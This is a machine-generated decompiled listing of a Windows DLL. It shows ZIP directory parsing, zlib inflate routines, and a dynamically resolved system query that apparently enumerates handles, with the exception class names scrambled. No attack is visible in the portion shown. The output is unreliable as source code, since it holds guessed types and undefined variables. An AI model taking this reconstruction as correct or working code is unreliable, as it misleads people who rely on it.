  LOBYTE(v25) = 4;
  sub_1000B3DF(v17);
  LOBYTE(v25) = 1;
  sub_1000A159(&v22);
  LOBYTE(v25) = 0;
  sub_1000B3DF(v18);
  return a2;
}
// 10025C45: variable 'v3' is possibly undefined
// 10025C95: variable 'v6' is possibly undefined
// 10025CAE: variable 'v8' is possibly undefined
// 10025BE5: using guessed type int var_38[3];
// 10025BE5: using guessed type int var_4C[5];

//----- (10025D38) --------------------------------------------------------
char __thiscall sub_10025D38(void *this)
{
  int v1; // eax
  LONG *v2; // eax
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // eax
  char v11; // bl
  _DWORD *v12; // esi
  _DWORD *v13; // eax
  char v14; // bl
  _DWORD *v15; // eax
  int v17; // [esp-8h] [ebp-60h] BYREF
  int v18; // [esp-4h] [ebp-5Ch]
  int v19[5]; // [esp+Ch] [ebp-4Ch] BYREF
  int v20[3]; // [esp+20h] [ebp-38h] BYREF
  int v21; // [esp+2Ch] [ebp-2Ch]
  int v22; // [esp+34h] [ebp-24h] BYREF
  int *pExceptionObject; // [esp+38h] [ebp-20h] BYREF
  int v24; // [esp+3Ch] [ebp-1Ch] BYREF
  void *v25; // [esp+40h] [ebp-18h] BYREF
  bool v26; // [esp+47h] [ebp-11h]
  int v27; // [esp+54h] [ebp-4h]

  if ( (dword_10193B24 & 1) == 0 )
  {
    dword_10193B24 |= 1u;
    v27 = 0;
    v18 = (int)this;
    v17 = (int)this;
    pExceptionObject = &v17;
    sub_1000D372(&v17, (int)&unk_10186A60);
    LOBYTE(v27) = 0;
    dword_101832A4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1001E665((int)&unk_10186A58);
    v27 = -1;
  }
  v25 = 0;
  sub_1000B1F3(0, (int)v20, 0);
  v27 = 2;
  v1 = dword_101832A4(0, 3, 0, 0, &v25);
  if ( v1 != -1073741820 )
  {
    v8 = sub_10050D97(&v22, v1);
    LOBYTE(v27) = 5;
    v18 = 181;
LABEL_6:
    sub_10015338((int)v8, v18);
  }
  v2 = (LONG *)sub_1000B1F3(v25, (int)v19, 0);
  LOBYTE(v27) = 3;
  sub_1000B3BD(v2, (int)v20);
  LOBYTE(v27) = 2;
  sub_1000B3DF(v19);
  v18 = (int)&v25;
  v17 = v21;
  v4 = sub_1000B49B(v20, v3);
  if ( dword_101832A4(0, 3, v4, v17, v18) < 0 )
  {
    v18 = (int)&v25;
    v17 = v21;
    v6 = sub_1000B49B(v20, v5);
    v7 = dword_101832A4(0, 3, v6, v17, v18);
    v8 = sub_10050D97(&v22, v7);
    LOBYTE(v27) = 4;
    v18 = 176;
    goto LABEL_6;
  }
  *(_BYTE *)(v20[1] + 8) = 1;
  v9 = (_DWORD *)sub_1000B4B8(v20);
  if ( *v9 > 0xFFu )
  {
    v10 = sub_1000E7F7(&pExceptionObject, 1, 0);
    LOBYTE(v27) = 6;
    v18 = 192;
    sub_10007882((int)v10);
  }
  v11 = 0;
  v12 = v9 + 1;
  if ( !*v9 )
    goto LABEL_14;
  while ( 1 )
  {
    v13 = sub_1000D17D(&v22, (wchar_t *)v12[1]);
    LOBYTE(v27) = 7;
    v26 = sub_1000DE70((int)&unk_10186A40, (int)v13);
    LOBYTE(v27) = 2;
    sub_1000D3AD(&v22);
    if ( v26 )
      break;
    v12 = (_DWORD *)((char *)v12 + (-(*((unsigned __int16 *)v12 + 1) + 96) & 3) + *((unsigned __int16 *)v12 + 1) + 96);
    if ( (unsigned int)(unsigned __int8)++v11 >= *v9 )
      goto LABEL_14;
  }
  v14 = v11 + 1;
  if ( !v14 )
  {
LABEL_14:
    v15 = sub_100245AE(&v24);
    LOBYTE(v27) = 8;
    sub_1000EE19(&pExceptionObject, (int)v15);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__);
  }
  v27 = -1;
  sub_1000B3DF(v20);
  return v14;
}
// 10025DF0: variable 'v3' is possibly undefined
// 10025E0F: variable 'v5' is possibly undefined
// 101832A4: using guessed type int (__stdcall *dword_101832A4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10193B24: using guessed type int dword_10193B24;
// 10025D38: using guessed type void *var_18;
// 10025D38: using guessed type int var_4C[5];

//----- (10025F26) --------------------------------------------------------
_DWORD *__cdecl sub_10025F26(_DWORD *a1)
{
  int v1; // esi
  int v2; // ecx
  char *v3; // eax
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  int v7; // eax
  LONG *v9; // eax
  int v10; // ecx
  int v11; // eax
  _DWORD *v12; // eax
  int v13; // [esp-8h] [ebp-54h] BYREF
  int v14; // [esp-4h] [ebp-50h]
  int v15[5]; // [esp+Ch] [ebp-40h] BYREF
  int v16[3]; // [esp+20h] [ebp-2Ch] BYREF
  int v17; // [esp+2Ch] [ebp-20h]
  int v18; // [esp+34h] [ebp-18h]
  void *v19; // [esp+38h] [ebp-14h] BYREF
  char *v20; // [esp+3Ch] [ebp-10h]
  int v21; // [esp+48h] [ebp-4h]

  v18 = 0;
  v1 = 1024;
  sub_1000B1F3((void *)0x400, (int)v16, 0);
  v21 = 1;
  v14 = v2;
  v13 = v2;
  v19 = &v13;
  sub_1000D372(&v13, (int)&unk_10186A68);
  LOBYTE(v21) = 1;
  v3 = sub_1001E665((int)&unk_10186A58);
  v14 = 0;
  v13 = v17;
  v20 = v3;
  v5 = sub_1000B49B(v16, v4);
  v6 = ((int (__stdcall *)(int, int, int, int))v20)(16, v5, v13, v14);
  if ( v6 )
  {
    while ( 1 )
    {
      v14 = 0;
      if ( v6 != -1073741820 )
      {
        v12 = sub_1000E7F7(&v19, 1, v14);
        LOBYTE(v21) = 3;
        v14 = 240;
        sub_10007882((int)v12);
      }
      v19 = (void *)(2 * v1);
      v9 = (LONG *)sub_1000B1F3((void *)(2 * v1), (int)v15, (void *)v14);
      LOBYTE(v21) = 4;
      sub_1000B3BD(v9, (int)v16);
      LOBYTE(v21) = 1;
      sub_1000B3DF(v15);
      v14 = 0;
      v13 = v17;
      v11 = sub_1000B49B(v16, v10);
      v6 = ((int (__stdcall *)(int, int, int, int))v20)(16, v11, v13, v14);
      if ( !v6 )
        break;
      v1 = (int)v19;
    }
  }
  sub_1000B36F(v16, (int)a1);
  LOBYTE(v21) = 5;
  v7 = *(_DWORD *)sub_1000B4B8(a1);
  a1[6] = 0;
  a1[5] = v7;
  v18 = 1;
  LOBYTE(v21) = 0;
  sub_1000B3DF(v16);
  return a1;
}
// 10025F53: variable 'v2' is possibly undefined
// 10025F85: variable 'v4' is possibly undefined
// 10026017: variable 'v10' is possibly undefined
// 10025F26: using guessed type int var_2C[3];
// 10025F26: using guessed type int var_40[5];

//----- (10026045) --------------------------------------------------------
int __userpurge sub_10026045@<eax>(_DWORD *a1@<edi>, int a2)
{
  unsigned int v2; // esi
  _DWORD *v3; // eax
  int v4; // eax
  char v5; // cl
  int v6; // esi
  int v7; // ebx
  int v8; // edx
  int v9; // eax
  int v11; // [esp+10h] [ebp-14h] BYREF
  char v12; // [esp+14h] [ebp-10h]
  int v13; // [esp+20h] [ebp-4h]

  v13 = 0;
  v2 = a1[6];
  if ( a1[5] <= v2 )
  {
    v3 = sub_1000E8EF(&v11);
    v13 = 1;
    sub_100078FE((int)v3);
  }
  v4 = 16 * v2 + sub_1000B4B8(a1);
  v5 = *(_BYTE *)(v4 + 8);
  v6 = *(_DWORD *)(v4 + 16);
  v11 = *(_DWORD *)(v4 + 12);
  v12 = *(_BYTE *)(v4 + 9);
  v7 = *(_DWORD *)(v4 + 4);
  *(_DWORD *)(v8 + 4) = *(unsigned __int16 *)(v4 + 10);
  *(_BYTE *)(v8 + 12) = v12;
  v9 = v11;
  *(_DWORD *)v8 = &off_1010311C;
  *(_DWORD *)(v8 + 8) = v7;
  *(_DWORD *)(v8 + 16) = v9;
  *(_DWORD *)(v8 + 20) = v6;
  *(_BYTE *)(v8 + 24) = v5;
  v13 = 0;
  ++a1[6];
  return v8;
}
// 100260A7: variable 'v8' is possibly undefined
// 1010311C: using guessed type int (__thiscall *off_1010311C)(void *Block, char);

//----- (100260E5) --------------------------------------------------------
int __usercall sub_100260E5@<eax>(char a1@<al>, int a2@<esi>)
{
  *(_BYTE *)(a2 + 70) = a1;
  *(_BYTE *)(a2 + 4) = 1;
  *(_DWORD *)a2 = &off_10103140;
  *(_DWORD *)(a2 + 8) = 15;
  *(_DWORD *)(a2 + 44) = 0;
  *(_DWORD *)(a2 + 48) = 0;
  *(_DWORD *)(a2 + 52) = 0;
  sub_10026390(a2);
  return a2;
}
// 10103140: using guessed type int (__thiscall *off_10103140)(void *Block, char);

//----- (1002610F) --------------------------------------------------------
_BYTE *__thiscall sub_1002610F(_BYTE *Block, char a2)
{
  sub_1002612E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002612E) --------------------------------------------------------
void *__thiscall sub_1002612E(_BYTE *this)
{
  void *result; // eax
  _DWORD v2[8]; // [esp+0h] [ebp-20h] BYREF

  result = &loc_100A80E1;
  v2[4] = v2;
  *(_DWORD *)this = &off_10103140;
  v2[7] = 0;
  if ( !this[69] )
    return (void *)sub_100263DD((int)this);
  return result;
}
// 10103140: using guessed type int (__thiscall *off_10103140)(void *Block, char);

//----- (10026173) --------------------------------------------------------
int __thiscall sub_10026173(_BYTE *this)
{
  if ( !this[69] )
    sub_100263DD((int)this);
  return sub_10026390((int)this);
}

//----- (1002618A) --------------------------------------------------------
void *__thiscall sub_1002618A(int this, void *a2, _DWORD *a3, void *a4, _DWORD *a5)
{
  bool v6; // zf
  int v7; // ecx
  int v8; // eax
  void **v9; // edx
  int v10; // eax
  _DWORD *v11; // eax
  int v12; // edi
  int v13; // eax
  int v15[3]; // [esp+Ch] [ebp-24h] BYREF
  int v16; // [esp+18h] [ebp-18h]
  int v17; // [esp+20h] [ebp-10h]
  int v18; // [esp+2Ch] [ebp-4h]
  int v19; // [esp+40h] [ebp+10h]

  v17 = 0;
  v6 = *(_BYTE *)(this + 69) == 0;
  *(_BYTE *)(this + 68) = 1;
  if ( v6 )
  {
    sub_1000B1F3(a4, (int)v15, 0);
    v18 = 1;
    *(_DWORD *)(this + 24) = sub_1000B49B(v15, v7);
    *(_DWORD *)(this + 28) = v16;
    v8 = sub_1000B4B8(a3);
    *v9 = (void *)v8;
    *(_DWORD *)(this + 16) = a3[3];
    v10 = sub_10026992(v9, *(_BYTE *)(this + 70) != 0);
    v19 = v10;
    if ( v10 )
    {
      if ( v10 != 1 )
      {
        v11 = sub_100245AE(&a5);
        LOBYTE(v18) = 2;
        sub_1002644F((int)v11);
      }
      sub_100263DD(this);
    }
    v12 = a3[3];
    v13 = v16 - *(_DWORD *)(this + 28);
    if ( v19 == 1 )
      *a5 = v12;
    else
      *a5 = v12 - *(_DWORD *)(this + 16);
    *(_BYTE *)(v15[1] + 8) = 1;
    sub_1000B67C(v15, (int)a2, 0, v13);
    v17 = 1;
    LOBYTE(v18) = 0;
    sub_1000B3DF(v15);
  }
  else
  {
    *a5 = 0;
    sub_1000B1F3(0, (int)a2, 0);
    v18 = 0;
    v17 = 1;
  }
  return a2;
}
// 100261DE: variable 'v7' is possibly undefined
// 100261F9: variable 'v9' is possibly undefined

//----- (10026291) --------------------------------------------------------
void *__thiscall sub_10026291(int this, void *a2, void *a3)
{
  int v4; // ecx
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // eax
  int v9[3]; // [esp+8h] [ebp-24h] BYREF
  int v10; // [esp+14h] [ebp-18h]
  int v11; // [esp+1Ch] [ebp-10h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  if ( !*(_BYTE *)(this + 68) || *(_BYTE *)(this + 69) )
  {
    sub_1000B1F3(0, (int)a2, 0);
    v12 = 0;
    v11 = 1;
  }
  else
  {
    sub_1000B1F3(a3, (int)v9, 0);
    v12 = 1;
    *(_DWORD *)(this + 24) = sub_1000B49B(v9, v4);
    *(_DWORD *)(this + 28) = v10;
    v5 = sub_10026992((void **)(this + 12), *(_BYTE *)(this + 70) != 0);
    *(_BYTE *)(v9[1] + 8) = 1;
    v6 = v10 - *(_DWORD *)(this + 28);
    if ( v5 )
    {
      if ( v5 != 1 )
      {
        v7 = sub_100245AE(&a3);
        LOBYTE(v12) = 3;
LABEL_7:
        sub_1002644F((int)v7);
      }
      sub_100263DD(this);
    }
    else if ( v6 != v10 )
    {
      v7 = sub_100245AE(&a3);
      LOBYTE(v12) = 2;
      goto LABEL_7;
    }
    sub_1000B67C(v9, (int)a2, 0, v6);
    v11 = 1;
    LOBYTE(v12) = 0;
    sub_1000B3DF(v9);
  }
  return a2;
}
// 100262F2: variable 'v4' is possibly undefined

//----- (10026390) --------------------------------------------------------
int __stdcall sub_10026390(int a1)
{
  int v1; // eax
  int result; // eax
  _DWORD *v3; // eax

  v1 = a1;
  *(_BYTE *)(a1 + 68) = 0;
  *(_BYTE *)(v1 + 69) = 0;
  result = sub_1002681B(*(_DWORD *)(v1 + 8), (_DWORD *)(v1 + 12));
  if ( result )
  {
    v3 = sub_100245AE(&a1);
    sub_1002644F((int)v3);
  }
  return result;
}

//----- (100263DD) --------------------------------------------------------
int __stdcall sub_100263DD(int a1)
{
  _DWORD *v1; // esi
  bool v2; // zf
  int v3; // eax
  void (__cdecl *v4)(_DWORD, int); // ecx
  int v5; // eax
  int result; // eax
  _DWORD *v7; // eax

  v1 = (_DWORD *)(a1 + 12);
  v2 = a1 == -12;
  *(_BYTE *)(a1 + 69) = 1;
  if ( v2 || (v3 = v1[7]) == 0 || (v4 = (void (__cdecl *)(_DWORD, int))v1[9]) == 0 )
  {
    v7 = sub_100245AE(&a1);
    sub_1002644F((int)v7);
  }
  v5 = *(_DWORD *)(v3 + 52);
  if ( v5 )
    v4(v1[10], v5);
  result = ((int (__cdecl *)(_DWORD, _DWORD))v1[9])(v1[10], v1[7]);
  v1[7] = 0;
  return result;
}

//----- (1002644B) --------------------------------------------------------
char __thiscall sub_1002644B(_BYTE *this)
{
  return this[68];
}

//----- (1002644F) --------------------------------------------------------
void __cdecl __noreturn sub_1002644F(int pExceptionObject)
{
  sub_1000EE19(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
}

//----- (1002646F) --------------------------------------------------------
void *__thiscall sub_1002646F(_DWORD *this, void *a2, _DWORD *a3)
{
  int v3; // esi
  _DWORD *v4; // ebx
  unsigned int v5; // edi
  int v6; // eax
  LONG *v7; // eax
  _DWORD *v8; // esi
  int v9; // eax
  int v10; // edi
  _DWORD *v12; // eax
  _DWORD v13[9]; // [esp+Ch] [ebp-7Ch] BYREF
  int v14[5]; // [esp+30h] [ebp-58h] BYREF
  int v15[5]; // [esp+44h] [ebp-44h] BYREF
  int v16[3]; // [esp+58h] [ebp-30h] BYREF
  int v17; // [esp+64h] [ebp-24h]
  int v18; // [esp+6Ch] [ebp-1Ch]
  _DWORD *v19; // [esp+70h] [ebp-18h]
  unsigned int v20; // [esp+74h] [ebp-14h]
  int v21; // [esp+78h] [ebp-10h] BYREF
  int v22; // [esp+84h] [ebp-4h]

  v18 = 0;
  v3 = (int)this;
  v19 = this;
  sub_1001AC1E((int)v13);
  v22 = 1;
  v4 = a3;
  sub_1000B36F(a3, (int)v15);
  LOBYTE(v22) = 2;
  v5 = v4[3];
  v6 = *(_DWORD *)v3;
  a3 = 0;
  v20 = v5;
  (*(void (__thiscall **)(int))(v6 + 8))(v3);
  if ( v5 )
  {
    do
    {
      v7 = (LONG *)sub_1000B67C(v4, (int)v14, (int)a3, v20 - (_DWORD)a3);
      LOBYTE(v22) = 3;
      sub_1000B3BD(v7, (int)v15);
      LOBYTE(v22) = 2;
      sub_1000B3DF(v14);
      v8 = v19;
      v9 = *v19;
      v21 = 0;
      (*(void (__thiscall **)(_DWORD *, int *, int *, int, int *))(v9 + 12))(v19, v16, v15, 1024, &v21);
      LOBYTE(v22) = 4;
      if ( !v17 && !v21 )
      {
        v12 = sub_1000E7F7(&a3, 1, 0);
        LOBYTE(v22) = 5;
        sub_10007882((int)v12);
      }
      a3 = (_DWORD *)((char *)a3 + v21);
      sub_1001AD28(v13, v16);
      if ( *((_BYTE *)v8 + 4) )
        Sleep(0xAu);
      LOBYTE(v22) = 2;
      sub_1000B3DF(v16);
    }
    while ( (unsigned int)a3 < v20 );
    v3 = (int)v19;
  }
  do
  {
    (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)v3 + 16))(v3, v16, 1024);
    LOBYTE(v22) = 6;
    sub_1001AD28(v13, v16);
    v10 = v17;
    LOBYTE(v22) = 2;
    sub_1000B3DF(v16);
  }
  while ( v10 );
  (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  sub_1001AD84(v13, (int)a2);
  v18 = 1;
  LOBYTE(v22) = 1;
  sub_1000B3DF(v15);
  LOBYTE(v22) = 0;
  sub_1001AC89((int)v13);
  return a2;
}
// 1002646F: using guessed type _DWORD var_7C[9];
// 1002646F: using guessed type int var_44[5];
// 1002646F: using guessed type int var_58[5];
// 1002646F: using guessed type int var_30[3];

//----- (100265EA) --------------------------------------------------------
_DWORD *__stdcall sub_100265EA(_DWORD *a1, int a2)
{
  int v2; // eax
  int v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  int v9; // [esp+0h] [ebp-68h] BYREF
  int v10[5]; // [esp+Ch] [ebp-5Ch] BYREF
  int v11[5]; // [esp+20h] [ebp-48h] BYREF
  int v12[5]; // [esp+34h] [ebp-34h] BYREF
  int v13; // [esp+48h] [ebp-20h] BYREF
  int v14; // [esp+4Ch] [ebp-1Ch] BYREF
  int v15; // [esp+50h] [ebp-18h]
  int *v16; // [esp+58h] [ebp-10h]
  int v17; // [esp+64h] [ebp-4h]

  v16 = &v9;
  sub_1000D17D(a1 + 1, &word_10178CC4);
  v17 = 0;
  sub_1000D17D(a1 + 3, &word_10178CC8);
  LOBYTE(v17) = 1;
  v15 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 4))(a2);
  LOBYTE(v17) = 2;
  sub_1000B1F3((void *)0x2E, (int)v10, 0);
  LOBYTE(v17) = 3;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a2 + 20))(a2, v10);
  v2 = sub_1000B4B8(v10);
  v3 = v2;
  if ( *(_DWORD *)v2 != 33639248 )
  {
    v4 = sub_1002539B(&v14);
    LOBYTE(v17) = 4;
    sub_10025A05((int)v4);
  }
  sub_1000B1F3((void *)*(unsigned __int16 *)(v2 + 28), (int)v11, 0);
  LOBYTE(v17) = 5;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a2 + 20))(a2, v11);
  v5 = sub_1000D2FA(&v13, 1u);
  LOBYTE(v17) = 6;
  sub_10001236(v5 + 1, a1 + 2);
  LOBYTE(v17) = 5;
  sub_1000D3AD(&v13);
  if ( *(_WORD *)(v3 + 32) )
  {
    sub_1000B1F3((void *)*(unsigned __int16 *)(v3 + 32), (int)v12, 0);
    LOBYTE(v17) = 7;
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)a2 + 20))(a2, v12);
    v6 = sub_1000D2FA(&v13, 1u);
    LOBYTE(v17) = 8;
    sub_10001236(v6 + 1, a1 + 4);
    LOBYTE(v17) = 7;
    sub_1000D3AD(&v13);
    LOBYTE(v17) = 5;
    sub_1000B3DF(v12);
  }
  if ( *(_WORD *)(v3 + 30) )
  {
    sub_1000B1F3((void *)*(unsigned __int16 *)(v3 + 30), (int)v12, 0);
    LOBYTE(v17) = 9;
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)a2 + 20))(a2, v12);
    LOBYTE(v17) = 5;
    sub_1000B3DF(v12);
  }
  v7 = *(unsigned __int16 *)(v3 + 14);
  a1[6] = v7;
  v7 <<= 16;
  a1[6] = v7;
  a1[6] = v7 | *(unsigned __int16 *)(v3 + 12);
  *a1 = *(_DWORD *)(v3 + 42);
  a1[5] = v15;
  a1[7] = *(_DWORD *)(v3 + 24);
  a1[8] = *(_DWORD *)(v3 + 20);
  LOBYTE(v17) = 3;
  sub_1000B3DF(v11);
  LOBYTE(v17) = 2;
  sub_1000B3DF(v10);
  return a1;
}
// 100265EA: using guessed type int var_5C[5];
// 100265EA: using guessed type int var_48[5];
// 100265EA: using guessed type int var_34[5];

//----- (1002681B) --------------------------------------------------------
int __usercall sub_1002681B@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  _DWORD *v2; // eax
  bool v4; // zf
  _DWORD *v5; // eax

  if ( byte_10178CCC != byte_10182BD4 )
    return -6;
  if ( !a2 )
    return -2;
  v4 = a2[8] == 0;
  a2[6] = 0;
  if ( v4 )
  {
    a2[8] = sub_10027F38;
    a2[10] = 0;
  }
  if ( !a2[9] )
    a2[9] = sub_10027F4B;
  v5 = (_DWORD *)((int (__cdecl *)(_DWORD, int, int))a2[8])(a2[10], 1, 9520);
  if ( !v5 )
    return -4;
  a2[7] = v5;
  if ( a1 >= 0 )
  {
    v5[2] = (a1 >> 4) + 1;
    if ( a1 < 48 )
      a1 &= 0xFu;
  }
  else
  {
    v5[2] = 0;
    a1 = -a1;
  }
  if ( (unsigned int)(a1 - 8) > 7 )
  {
    ((void (__cdecl *)(_DWORD, _DWORD *))a2[9])(a2[10], v5);
    a2[7] = 0;
    return -2;
  }
  v5[9] = a1;
  v5[13] = 0;
  v2 = (_DWORD *)a2[7];
  if ( !v2 )
    return -2;
  v2[7] = 0;
  a2[5] = 0;
  a2[2] = 0;
  a2[6] = 0;
  a2[12] = 1;
  *v2 = 0;
  v2[1] = 0;
  v2[3] = 0;
  v2[5] = 0x8000;
  v2[8] = 0;
  v2[10] = 0;
  v2[11] = 0;
  v2[12] = 0;
  v2[14] = 0;
  v2[15] = 0;
  v2[27] = v2 + 332;
  v2[20] = v2 + 332;
  v2[19] = v2 + 332;
  return 0;
}
// 100267C8: conditional instruction was optimized away because esi.4!=0
// 10178CCC: using guessed type char byte_10178CCC;
// 10182BD4: using guessed type char byte_10182BD4;

//----- (100268BA) --------------------------------------------------------
int __usercall sub_100268BA@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  int v4; // eax
  int v6; // ecx
  size_t v7; // ebx
  size_t v8; // eax
  size_t v9; // ebx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  size_t Size; // [esp+8h] [ebp-4h]

  v2 = *(_DWORD *)(a2 + 28);
  if ( !*(_DWORD *)(v2 + 52) )
  {
    v4 = (*(int (__cdecl **)(_DWORD, int, int))(a2 + 32))(*(_DWORD *)(a2 + 40), 1 << *(_DWORD *)(v2 + 36), 1);
    *(_DWORD *)(v2 + 52) = v4;
    if ( !v4 )
      return 1;
  }
  if ( !*(_DWORD *)(v2 + 40) )
  {
    v6 = *(_DWORD *)(v2 + 36);
    *(_DWORD *)(v2 + 48) = 0;
    *(_DWORD *)(v2 + 44) = 0;
    *(_DWORD *)(v2 + 40) = 1 << v6;
  }
  v7 = a1 - *(_DWORD *)(a2 + 16);
  v8 = *(_DWORD *)(v2 + 40);
  if ( v7 < v8 )
  {
    Size = v8 - *(_DWORD *)(v2 + 48);
    if ( Size > v7 )
      Size = v7;
    memcpy((void *)(*(_DWORD *)(v2 + 48) + *(_DWORD *)(v2 + 52)), (const void *)(*(_DWORD *)(a2 + 12) - v7), Size);
    v9 = v7 - Size;
    if ( !v9 )
    {
      *(_DWORD *)(v2 + 48) += Size;
      v10 = *(_DWORD *)(v2 + 40);
      if ( *(_DWORD *)(v2 + 48) == v10 )
        *(_DWORD *)(v2 + 48) = 0;
      v11 = *(_DWORD *)(v2 + 44);
      if ( v11 < v10 )
        *(_DWORD *)(v2 + 44) = Size + v11;
      return 0;
    }
    memcpy(*(void **)(v2 + 52), (const void *)(*(_DWORD *)(a2 + 12) - v9), v9);
    *(_DWORD *)(v2 + 48) = v9;
  }
  else
  {
    memcpy(*(void **)(v2 + 52), (const void *)(*(_DWORD *)(a2 + 12) - v8), *(_DWORD *)(v2 + 40));
    *(_DWORD *)(v2 + 48) = 0;
  }
  *(_DWORD *)(v2 + 44) = *(_DWORD *)(v2 + 40);
  return 0;
}

//----- (10026992) --------------------------------------------------------
int __cdecl sub_10026992(void **a1, int a2)
{
  void **v2; // esi
  unsigned __int16 *v3; // ebx
  unsigned int v4; // edx
  unsigned int v5; // edi
  int v6; // eax
  int v7; // edx
  int v8; // eax
  unsigned int v9; // ecx
  int v10; // eax
  unsigned int v11; // ecx
  bool v12; // zf
  unsigned int *v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  size_t v19; // edx
  _DWORD *v20; // ecx
  int v21; // eax
  size_t v22; // ecx
  size_t v23; // eax
  size_t v24; // ecx
  int v25; // eax
  int v26; // eax
  unsigned int v27; // ecx
  size_t v28; // eax
  int v29; // edx
  int v30; // eax
  unsigned int v31; // ecx
  int v32; // eax
  int v33; // eax
  int v34; // edx
  int v35; // eax
  unsigned int v36; // ecx
  int v37; // eax
  int v38; // eax
  int v39; // eax
  int v40; // eax
  int v41; // eax
  unsigned __int16 v42; // cx
  unsigned int v43; // eax
  int v44; // ecx
  int v45; // eax
  char v46; // al
  unsigned int v47; // edi
  int v48; // ecx
  int v49; // eax
  int v50; // eax
  char v51; // al
  char v52; // al
  char v53; // al
  bool v54; // cc
  int v55; // eax
  char v56; // al
  int v57; // ecx
  void **v58; // eax
  int v59; // eax
  int v60; // eax
  unsigned int v61; // ecx
  int v62; // edx
  int v63; // eax
  int v64; // edx
  int v65; // eax
  char v66; // al
  int v67; // eax
  int v68; // edx
  int v69; // eax
  int v70; // eax
  _DWORD **v71; // esi
  unsigned int i; // eax
  int v73; // eax
  int v74; // eax
  int v75; // ecx
  int v76; // edx
  int v77; // eax
  unsigned int v78; // eax
  int v79; // edx
  int v80; // edx
  int v81; // edx
  unsigned int j; // eax
  int v83; // eax
  int v84; // eax
  int v85; // ecx
  int v86; // edx
  int v87; // eax
  unsigned int v88; // eax
  int v89; // edx
  int v90; // edx
  int v91; // edx
  unsigned int v92; // ecx
  int v93; // eax
  size_t v94; // ecx
  int v95; // eax
  char *v96; // eax
  size_t v97; // ecx
  _BYTE *v98; // edx
  char v99; // cl
  _BYTE *v100; // ecx
  char v101; // al
  int v102; // eax
  unsigned int v103; // eax
  int v104; // eax
  unsigned int v105; // eax
  unsigned __int16 v106; // cx
  int v107; // eax
  size_t v109; // eax
  unsigned int v110; // edi
  int v111; // eax
  int v112; // ecx
  unsigned int v113; // [esp-Ch] [ebp-48h]
  unsigned int v114; // [esp-Ch] [ebp-48h]
  int v115; // [esp-4h] [ebp-40h]
  size_t v117; // [esp+Ch] [ebp-30h]
  size_t v118; // [esp+Ch] [ebp-30h]
  int v119; // [esp+10h] [ebp-2Ch]
  size_t v120; // [esp+10h] [ebp-2Ch]
  int v121; // [esp+14h] [ebp-28h]
  int v122; // [esp+14h] [ebp-28h]
  unsigned __int16 v123; // [esp+14h] [ebp-28h]
  unsigned int v124; // [esp+14h] [ebp-28h]
  unsigned int v125; // [esp+14h] [ebp-28h]
  int v126; // [esp+18h] [ebp-24h]
  int v127; // [esp+1Ch] [ebp-20h]
  char *v128; // [esp+20h] [ebp-1Ch]
  unsigned int v129; // [esp+24h] [ebp-18h] BYREF
  size_t v130; // [esp+28h] [ebp-14h]
  size_t Size; // [esp+2Ch] [ebp-10h]
  size_t v132; // [esp+30h] [ebp-Ch]
  void *Src; // [esp+34h] [ebp-8h]
  unsigned int v134; // [esp+38h] [ebp-4h]

  v2 = a1;
  if ( !a1 )
    return -2;
  v3 = (unsigned __int16 *)a1[7];
  if ( !v3 || !a1[3] || !*a1 && a1[1] )
    return -2;
  if ( *(_DWORD *)v3 == 11 )
    *(_DWORD *)v3 = 12;
  v4 = *((_DWORD *)v3 + 14);
  v5 = *((_DWORD *)v3 + 15);
  v128 = (char *)a1[3];
  v130 = (size_t)a1[4];
  Src = *a1;
  v132 = (size_t)a1[1];
  v117 = v132;
  v134 = v4;
  v127 = v130;
  v126 = 0;
  while ( 2 )
  {
    switch ( *(_DWORD *)v3 )
    {
      case 0:
        v6 = *((_DWORD *)v3 + 2);
        if ( !v6 )
        {
          *(_DWORD *)v3 = 12;
          continue;
        }
        while ( v5 < 0x10 )
        {
          if ( !v132 )
            goto LABEL_319;
          v7 = *(unsigned __int8 *)Src;
          --v132;
          v134 += v7 << v5;
          Src = (char *)Src + 1;
          v5 += 8;
        }
        if ( (v6 & 2) != 0 && v134 == 35615 )
        {
          v5 = 0;
          *((_DWORD *)v3 + 6) = 0;
          LOWORD(v129) = -29921;
          *((_DWORD *)v3 + 6) = sub_1002854F(&v129, 0, 2u);
          v134 = 0;
          *(_DWORD *)v3 = 1;
          continue;
        }
        v8 = *((_DWORD *)v3 + 8);
        *((_DWORD *)v3 + 4) = 0;
        if ( v8 )
          *(_DWORD *)(v8 + 48) = -1;
        if ( (v3[4] & 1) == 0 || ((v134 >> 8) + ((unsigned __int8)v134 << 8)) % 0x1F )
        {
          v2[6] = aIncorrectHeade;
          goto LABEL_310;
        }
        if ( (v134 & 0xF) != 8 )
        {
          v2[6] = aUnknownCompres;
          goto LABEL_310;
        }
        v134 >>= 4;
        v9 = (v134 & 0xF) + 8;
        v5 -= 4;
        if ( v9 > *((_DWORD *)v3 + 9) )
        {
          v2[6] = aInvalidWindowS;
          goto LABEL_310;
        }
        *((_DWORD *)v3 + 6) = 1;
        *((_DWORD *)v3 + 5) = 1 << v9;
